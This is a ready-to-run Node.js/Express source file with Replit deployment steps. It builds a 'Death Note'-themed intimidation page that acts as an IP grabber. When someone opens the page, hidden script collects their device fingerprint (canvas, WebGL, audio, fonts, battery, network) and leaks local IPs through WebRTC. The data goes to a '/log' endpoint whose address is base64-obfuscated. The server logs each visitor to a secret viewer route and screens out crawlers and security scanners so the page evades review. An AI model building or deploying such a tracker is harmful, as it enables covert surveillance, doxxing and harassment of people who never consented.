// ============================================================
// INSTRUCTIONS:
// 1. Go to replit.com → Create Repl → Node.js → name: nearwilldie
// 2. Delete everything in main.js (or index.js)
// 3. Paste this ENTIRE file in
// 4. Hit Run — done
// ============================================================

const express = require(‘express’);
const fs = require(‘fs’);
const path = require(‘path’);

const app = express();
app.use(express.json());

const BOT_PATTERNS = [
/bot/i,/crawl/i,/spider/i,/slurp/i,/facebookexternalhit/i,
/Twitterbot/i,/LinkedInBot/i,/WhatsApp/i,/TelegramBot/i,
/Googlebot/i,/bingbot/i,/YandexBot/i,/DuckDuckBot/i,
/Baiduspider/i,/python-requests/i,/curl/i,/wget/i,
/Go-http-client/i,/axios/i,/node-fetch/i,/okhttp/i,
/Scrapy/i,/HTTrack/i,/masscan/i,/nmap/i,/zgrab/i,
/Nuclei/i,/sqlmap/i,/nikto/i,/dirbuster/i,/gobuster/i,
];

function isBot(ua) {
if (!ua || ua.length < 10) return true;
return BOT_PATTERNS.some(p => p.test(ua));
}

const HTML = `<!DOCTYPE html>

<html lang="en">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1.0"/>
  <title>light · archive</title>
  <link href="https://fonts.googleapis.com/css2?family=Special+Elite&family=Crimson+Text:ital,wght@0,400;1,400&display=swap" rel="stylesheet"/>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{width:100vw;height:100vh;overflow:hidden;background:#0a0a0a;font-family:'Crimson Text',serif}
    #bg{position:fixed;inset:0;background:url('https://i.postimg.cc/zf49rgvs/IMG-7284.jpg') center center/cover no-repeat;filter:brightness(0.6) contrast(1.08);z-index:0}
    #to{position:fixed;top:0;left:0;right:0;height:220px;background:linear-gradient(to bottom,rgba(0,0,0,0.92) 0%,transparent 100%);z-index:1}
    #nt{position:fixed;top:14px;left:50%;transform:translateX(-50%);z-index:10;width:min(520px,94vw);background:#f4efe6;border:1px solid #c4b494;border-radius:2px;padding:14px 20px 16px 20px;box-shadow:0 0 0 1px #b4a478,0 12px 55px rgba(0,0,0,0.8),inset 0 0 80px rgba(180,160,120,0.1);opacity:0;animation:na 1s ease forwards 0.4s}
    @keyframes na{from{opacity:0;transform:translateX(-50%) translateY(-8px)}to{opacity:1;transform:translateX(-50%) translateY(0)}}
    #nt::before{content:'';position:absolute;inset:0;background-image:repeating-linear-gradient(transparent,transparent 26px,#c4b49433 26px,#c4b49433 27px);border-radius:2px;pointer-events:none}
    #nt::after{content:'';position:absolute;top:0;bottom:0;left:34px;width:1px;background:rgba(160,50,50,0.3);pointer-events:none}
    .nh{font-family:'Special Elite',cursive;font-size:10px;color:#7a6a50;letter-spacing:.2em;text-transform:uppercase;margin-bottom:10px;padding-left:22px;opacity:.6}
    .ni{font-family:'Special Elite',cursive;font-size:22px;color:#0f0a04;padding-left:22px;margin-bottom:2px;letter-spacing:.03em;min-height:28px}
    .cur{display:inline-block;width:2px;height:20px;background:#0f0a04;margin-left:2px;vertical-align:middle;animation:bl 1s step-end infinite}
    @keyframes bl{0%,100%{opacity:1}50%{opacity:0}}
    .nd{height:1px;background:#c4b49444;margin:10px 0 8px 22px}
    .cod-lbl{font-family:'Special Elite',cursive;font-size:9px;color:#7a6a50;letter-spacing:.18em;text-transform:uppercase;padding-left:22px;margin-bottom:5px;opacity:.55}
    .cod{font-family:'Crimson Text',serif;font-style:italic;font-size:11px;color:#3a2a18;padding-left:22px;line-height:2;opacity:.8}
    .cod span{display:block}
    .nts{position:absolute;top:8px;right:12px;font-family:'Special Elite',cursive;font-size:8px;color:#7a6a50;opacity:.4;letter-spacing:.08em}
    #gr{position:fixed;inset:0;z-index:2;pointer-events:none;opacity:.025;background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");background-size:200px}
    .lt{color:#9a8a6a;font-style:italic;font-size:13px}
  </style>
</head>
<body>
  <div id="bg"></div>
  <div id="to"></div>
  <div id="gr"></div>
  <div id="nt">
    <div class="nts" id="ts"></div>
    <div class="nh">Death Note</div>
    <div class="ni" id="xd"><span class="lt">retrieving...</span></div>
    <div class="nd"></div>
    <div class="cod-lbl">cause of death</div>
    <div class="cod">
      <span id="x1">—</span>
      <span id="x2">—</span>
      <span id="x3">—</span>
      <span id="x4">—</span>
      <span id="x5">—</span>
      <span id="x6">—</span>
    </div>
  </div>
  <script>
  !function(){
    function _tw(e,t,s){
      e.innerHTML='';
      var c=document.createElement('span');c.className='cur';
      var i=0,iv=setInterval(function(){
        e.innerHTML=t.slice(0,i);e.appendChild(c);i++;
        if(i>t.length){clearInterval(iv);setTimeout(function(){c.remove()},1400);}
      },s||48);
    }
    function _cv(){
      try{var c=document.createElement('canvas'),g=c.getContext('2d');g.textBaseline='top';g.font='14px Arial';g.fillStyle='#f60';g.fillRect(125,1,62,20);g.fillStyle='#069';g.fillText('ABCDEF',2,2);g.fillStyle='rgba(102,204,0,0.7)';g.fillText('ABCDEF',4,17);return c.toDataURL().slice(-40);}catch(e){return'x';}
    }
    function _wg(){
      try{var c=document.createElement('canvas');var g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return'n/a';var d=g.getExtension('WEBGL_debug_renderer_info');return d?g.getParameter(d.UNMASKED_RENDERER_WEBGL):'n/a';}catch(e){return'n/a';}
    }
    function _wv(){
      try{var c=document.createElement('canvas');var g=c.getContext('webgl')||c.getContext('experimental-webgl');if(!g)return'n/a';var d=g.getExtension('WEBGL_debug_renderer_info');return d?g.getParameter(d.UNMASKED_VENDOR_WEBGL):'n/a';}catch(e){return'n/a';}
    }
    function _au(){
      try{var a=new(window.AudioContext||window.webkitAudioContext)();var o=a.createOscillator(),an=a.createAnalyser(),g=a.createGain();g.gain.value=0;o.connect(an);an.connect(g);g.connect(a.destination);o.start(0);var d=new Float32Array(an.frequencyBinCount);an.getFloatFrequencyData(d);o.stop();a.close();var s=0;for(var i=0;i<d.length;i++)s+=Math.abs(d[i]);return s.toFixed(6);}catch(e){return'n/a';}
    }
    function _rtc(){
      return new Promise(function(res){try{var ips=[],pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});pc.createDataChannel('');pc.createOffer().then(function(o){return pc.setLocalDescription(o);});pc.onicecandidate=function(e){if(!e||!e.candidate)return;var m=e.candidate.candidate.match(/(\d+\.\d+\.\d+\.\d+)/g);if(m)ips=ips.concat(m);};setTimeout(function(){pc.close();res([...new Set(ips)].join(',')||'n/a');},600);}catch(e){res('n/a');}});
    }
    function _net(){
      try{var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(!c)return'n/a';return(c.effectiveType||'?')+' / '+(c.downlink||'?')+'mbps / rtt '+(c.rtt||'?')+'ms';}catch(e){return'n/a';}
    }
    function _bat(){
      return new Promise(function(res){try{if(!navigator.getBattery)return res('n/a');navigator.getBattery().then(function(b){res(Math.round(b.level*100)+'% / charging: '+b.charging);}).catch(function(){res('n/a');});}catch(e){res('n/a');}});
    }
    function _fn(){
      var fonts=['Arial','Helvetica','Times New Roman','Courier New','Georgia','Verdana','Comic Sans MS','Impact','Tahoma','Trebuchet MS'];
      var detected=[],canvas=document.createElement('canvas'),ctx=canvas.getContext('2d');
      canvas.width=200;canvas.height=30;
      function w(f){ctx.font='12px '+f;return ctx.measureText('mmmmmmm').width;}
      var base=w('monospace');
      for(var i=0;i<fonts.length;i++){if(w(fonts[i]+',monospace')!==base)detected.push(fonts[i]);}
      return detected.join(', ')||'n/a';
    }
    var now=new Date();
    document.getElementById('ts').textContent=now.toISOString().slice(0,10);
    var fp={
      screen:screen.width+'x'+screen.height,avail:screen.availWidth+'x'+screen.availHeight,
      depth:screen.colorDepth,dpr:window.devicePixelRatio||1,
      tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
      lang:navigator.language,langs:(navigator.languages||[]).slice(0,4).join(', '),
      platform:navigator.platform,ua:navigator.userAgent,
      cores:navigator.hardwareConcurrency||'?',mem:navigator.deviceMemory||'?',
      touch:navigator.maxTouchPoints||0,dnt:navigator.doNotTrack||'unset',
      net:_net(),canvas:_cv(),webgl:_wg(),webglv:_wv(),audio:_au(),fonts:_fn(),
      orient:screen.orientation?screen.orientation.type:'n/a',time:now.toISOString(),
    };
    Promise.all([_rtc(),_bat()]).then(function(r){
      fp.rtc=r[0];fp.bat=r[1];
      fetch(atob('L2xvZw=='),{method:'POST',headers:{[atob('Q29udGVudC1UeXBl')]:atob('YXBwbGljYXRpb24vanNvbg==')},body:JSON.stringify(fp)})
      .then(function(r){return r.json();})
      .then(function(d){
        _tw(document.getElementById('xd'),d.ip);
        document.getElementById('x1').textContent='device — '+fp.platform+' · '+fp.cores+' cores · '+fp.mem+'gb ram · '+fp.touch+' touch pts';
        document.getElementById('x2').textContent='display — '+fp.screen+' ('+fp.avail+') · '+fp.depth+'bit · x'+fp.dpr+' dpr · '+fp.orient;
        document.getElementById('x3').textContent='location — '+fp.tz+' · '+fp.langs+' · dnt: '+fp.dnt;
        document.getElementById('x4').textContent='network — '+fp.net+' · battery: '+fp.bat+' · local ip: '+fp.rtc;
        document.getElementById('x5').textContent='gpu — '+fp.webgl.slice(0,52)+' ['+fp.webglv.slice(0,20)+']';
        document.getElementById('x6').textContent='fingerprint — canvas: '+fp.canvas+' · audio: '+fp.audio.slice(0,10);
      })
      .catch(function(){document.getElementById('xd').textContent='???';});
    });
  }();
  </script>
</body>
</html>`;

app.get(’/’, (req, res) => res.send(HTML));

app.post(’/log’, (req, res) => {
const ip = req.headers[‘x-forwarded-for’]?.split(’,’)[0].trim() || req.socket.remoteAddress || ‘unknown’;
const ua = req.headers[‘user-agent’] || ‘’;
if (isBot(ua)) return res.json({ ip: ‘0.0.0.0’ });

const fp = req.body || {};
const entry = {
time: new Date().toISOString(), ip, ua,
referrer: req.headers[‘referer’] || ‘direct’,
net: fp.net||’?’, rtc: fp.rtc||’?’, bat: fp.bat||’?’,
platform: fp.platform||’?’, cores: fp.cores||’?’, mem: fp.mem||’?’, touch: fp.touch||’?’,
screen: fp.screen||’?’, avail: fp.avail||’?’, depth: fp.depth||’?’, dpr: fp.dpr||’?’,
tz: fp.tz||’?’, lang: fp.lang||’?’, langs: fp.langs||’?’, dnt: fp.dnt||’?’,
canvas: fp.canvas||’?’, webgl: fp.webgl||’?’, webglv: fp.webglv||’?’,
audio: fp.audio||’?’, fonts: fp.fonts||’?’, orient: fp.orient||’?’,
};

console.log(’\n┌─────────────────────────────────────────┐’);
console.log(’│ 📍 IP         ’, entry.ip);
console.log(’│ 🕐 Time       ’, entry.time);
console.log(’│ 💻 Device     ’, entry.platform, ‘·’, entry.cores, ‘cores ·’, entry.mem+‘gb · battery:’, entry.bat);
console.log(’│ 📐 Screen     ’, entry.screen, ‘·’, entry.depth+‘bit · dpr’+entry.dpr);
console.log(’│ 🌍 Location   ’, entry.tz, ‘·’, entry.langs);
console.log(’│ 🌐 Network    ’, entry.net, ‘· rtc:’, entry.rtc);
console.log(’│ 🎮 GPU        ’, entry.webgl);
console.log(’│ 🎵 Audio FP   ’, entry.audio);
console.log(’│ 🖼  Canvas FP  ’, entry.canvas);
console.log(’│ 🔗 Referrer   ’, entry.referrer);
console.log(‘└─────────────────────────────────────────┘’);

fs.appendFileSync(‘logs.txt’, JSON.stringify(entry) + ‘\n’);
res.json({ ip });
});

app.get(’/view-logs-dn42’, (req, res) => {
try {
const logs = fs.readFileSync(‘logs.txt’,‘utf8’).trim().split(’\n’).filter(Boolean).map(l=>JSON.parse(l)).reverse();
let html = `<!DOCTYPE html><html><head><title>logs</title><style>body{background:#0d0d0d;color:#c8b89a;font-family:monospace;padding:20px;font-size:12px}h2{color:#e8d8b0;margin-bottom:6px}.count{color:#6a5a45;margin-bottom:20px}.entry{border:1px solid #1e1e1e;padding:14px;margin-bottom:10px;background:#111;border-radius:3px}.ip{font-size:17px;color:#e8d8b0;margin-bottom:4px}.time{color:#6a5a45;margin-bottom:8px}.row{color:#8a7060;line-height:2;border-top:1px solid #1a1a1a;padding-top:8px}.lbl{color:#5a4a38}</style></head><body><h2>// death note — visitor log</h2><div class="count">${logs.length} entries</div>`;
for(const e of logs){
html+=`<div class="entry"><div class="ip">${e.ip}</div><div class="time">${e.time}</div><div class="row"><span class="lbl">platform</span> ${e.platform} · <span class="lbl">cores</span> ${e.cores} · <span class="lbl">ram</span> ${e.mem}gb · <span class="lbl">battery</span> ${e.bat} · <span class="lbl">touch</span> ${e.touch}<br><span class="lbl">screen</span> ${e.screen} (${e.avail}) · ${e.depth}bit · dpr ${e.dpr} · ${e.orient}<br><span class="lbl">tz</span> ${e.tz} · <span class="lbl">langs</span> ${e.langs} · <span class="lbl">dnt</span> ${e.dnt}<br><span class="lbl">net</span> ${e.net} · <span class="lbl">rtc</span> ${e.rtc}<br><span class="lbl">gpu</span> ${e.webgl} [${e.webglv}]<br><span class="lbl">audio</span> ${e.audio} · <span class="lbl">canvas</span> ${e.canvas}<br><span class="lbl">fonts</span> ${e.fonts}<br><span class="lbl">referrer</span> ${e.referrer}<br><span class="lbl">ua</span> ${e.ua}</div></div>`;
}
html+=`</body></html>`;
res.send(html);
} catch(e){ res.send(‘no logs yet’); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
console.log(`\n🌐 nearwilldie live on port ${PORT}`);
console.log(`📋 logs → /view-logs-dn42\n`);
});
